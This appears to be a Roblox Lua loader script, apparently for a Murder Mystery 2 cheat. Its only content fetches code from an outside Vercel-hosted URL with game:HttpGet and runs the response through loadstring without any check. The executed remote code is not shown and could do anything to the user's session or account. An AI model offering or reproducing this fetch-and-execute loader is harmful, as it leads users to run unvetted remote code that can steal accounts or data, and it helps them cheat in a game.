local success, result = pcall(function()
    return game:HttpGet("https://api-mm2-main.vercel.app/api/loader")
end)

if success then
    loadstring(result)()
end
